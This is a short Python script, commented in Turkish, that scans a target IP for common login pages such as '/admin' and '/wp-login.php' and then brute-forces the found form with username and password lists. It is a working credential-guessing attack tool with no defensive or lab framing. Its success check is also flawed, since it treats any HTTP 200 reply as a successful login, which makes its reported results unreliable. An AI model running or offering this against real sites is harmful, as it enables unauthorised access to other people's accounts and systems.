import requests
import time

# dirb mantığında dizin taraması yap
def find_login_page(ip):
    login_paths = [
        "/admin", "/login", "/user/login", "/wp-login.php", "/administrator", "/dashboard", "/signin", "/auth/login", "/"
    ]
    
    for path in login_paths:
        url = f"http://{ip}{path}"
        try:
            response = requests.get(url, timeout=3)
            if response.status_code == 200 and "password" in response.text.lower():
                print(f"[+] Login sayfası bulundu: {url}")
                return url
        except requests.RequestException:
            continue
    
    return None

# Brute-force denemesi yap
def web_brute_force(login_url, username_list, password_list):
    for username in username_list:
        for password in password_list:
            data = {"username": username, "password": password}
            response = requests.post(login_url, data=data)

            if "success" in response.text or response.status_code == 200:
                print(f"[ HTTP ] Başarılı giriş: {username}:{password} -> {login_url}")
                return username, password
            time.sleep(1)

    print("[ HTTP ] Giriş başarısız.")
    return None